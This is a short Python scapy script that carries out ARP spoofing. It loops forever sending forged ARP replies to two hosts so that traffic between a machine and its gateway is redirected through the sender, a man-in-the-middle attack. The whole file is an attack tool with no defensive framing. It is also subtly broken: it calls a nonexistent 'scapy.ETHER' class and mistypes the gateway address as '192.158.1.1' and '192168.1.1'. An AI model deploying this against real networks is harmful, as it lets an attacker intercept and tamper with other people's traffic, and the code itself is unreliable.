import scapy.all as scapy

def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.ETHER()
    broadcast.dst = "ff:ff:ff:ff:ff:ff"
    finalpacket = broadcast / arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)

def spoof_arp(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)


def main():
    try:
        while True:
            spoof_arp("192.158.1.1", "192.168.1.4")
            spoof_arp("192.168.1.4", "192168.1.1")

    except KeyboardInterrupt:
        exit()


main()
